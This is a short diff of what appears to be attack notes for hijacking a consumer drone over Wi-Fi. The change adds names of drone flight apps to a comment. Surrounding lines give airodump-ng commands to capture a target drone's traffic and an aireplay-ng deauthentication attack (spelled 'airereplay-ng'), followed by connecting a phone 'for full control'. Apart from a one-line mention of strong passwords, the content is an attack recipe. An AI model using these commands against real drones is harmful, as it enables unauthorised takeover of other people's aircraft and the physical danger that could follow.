@@ -16,6 +16,6 @@ airodump-ng -c 6 -- bssid "bssid of target drone" -w /root/drone wlan1mon # auto
 
 airereplay-ng -0 0 -a "bssid" -c "Station" wlan1mon # deauth attack and auto insertion of bssid
 
-# connect with phone for full control. Use drone flight app.
+# connect with phone for full control. Use drone flight app eg FreeFlight Pro or Freeflight Mini available in Google Play/AppleStore.
 
 # mitigate with strong password
